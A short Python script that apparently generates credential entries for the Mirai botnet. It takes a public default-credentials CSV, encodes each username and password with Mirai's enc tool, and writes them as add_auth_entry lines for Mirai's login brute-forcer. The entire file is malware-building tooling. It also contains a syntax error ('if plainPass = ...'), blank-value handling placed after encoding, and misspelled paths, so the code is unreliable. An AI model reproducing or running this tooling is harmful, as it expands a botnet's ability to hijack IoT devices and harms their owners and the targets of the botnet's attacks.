#run git clone https://github.com/ihebski/DefaultCreds-cheat-sheet.git

import csv
import subprocess

def encrypt(string):
  result = subprocess.run(['.Mirai-Source-Code/mirai/tools/enc.out', 'string', string], capture_output = True, text = True)
  encrypted_string = result.stdout.strip() 
  return encrypted_string.split('\n')[1][:-4]

def csvReader(csvIn, outputFile):
    with open(csvIn, 'r') as input, open(outputFile, 'w') as output:
      csvFile = csv.DictReader(input)
      for lines in csvFile:
        plainUser = lines['username']
        plainPass = lines['password']
        username = encrypt(plainUser)
        password = encrypt(plainPass)
        if plainUser == "<blank>":
          plainUser = ""
        if plainPass = "<blank>":
          plainPass = ""
        output.write(f'add_auth_entry("{username}", "{password}", 1); //{plainUser} {plainPass}\n')

def rmvDup(input, output):
  with open(input, 'r') as file:
    lines = file.readlines()
  rmv = set(lines)
  with open(output, 'w') as file:
    file.writelines(rmv)

input = 'DefaulCreds-cheat-sheet/DefaulCreds-Cheat-Sheet.csv'
#make a middle.txt file that contains the encrypted strings WITH duplicates
middle = 'mid.txt'
#make an output.txt file that CLEANS duplicates
output = 'output.txt'

csvReader(input, middle)
rmvDup(middle, output)
        
